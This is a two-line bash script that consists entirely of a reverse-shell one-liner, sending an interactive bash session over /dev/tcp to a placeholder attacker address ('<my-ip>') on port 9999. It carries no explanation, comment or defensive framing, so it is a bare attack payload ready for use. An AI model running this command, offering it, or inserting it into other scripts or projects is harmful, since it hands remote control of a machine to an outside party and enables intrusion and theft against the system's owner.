#!/bin/bash

bash -i >& /dev/tcp/<my-ip>/9999 0>&1
